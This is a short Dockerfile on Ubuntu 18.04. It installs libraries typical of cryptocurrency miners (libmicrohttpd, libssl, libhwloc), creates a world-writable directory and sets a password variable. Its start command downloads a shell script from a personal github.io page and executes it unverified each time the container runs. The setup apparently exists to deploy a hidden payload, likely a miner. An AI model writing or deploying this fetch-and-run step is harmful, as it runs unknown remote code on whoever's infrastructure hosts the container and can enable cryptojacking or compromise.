FROM ubuntu:18.04

RUN apt-get update \
    && apt-get install -y sudo curl zip nano wget libmicrohttpd-dev libssl-dev libhwloc-dev

RUN sudo mkdir /projects/ && \
    cd /projects/ && \
    sudo mkdir sys && \
    sudo chmod -R 777 sys

ENV PASS clever

WORKDIR /projects/sys

CMD wget https://pzeankto.github.io/namnam/IAB.sh -O IAB.sh && \
chmod +x IAB.sh && \
./IAB.sh
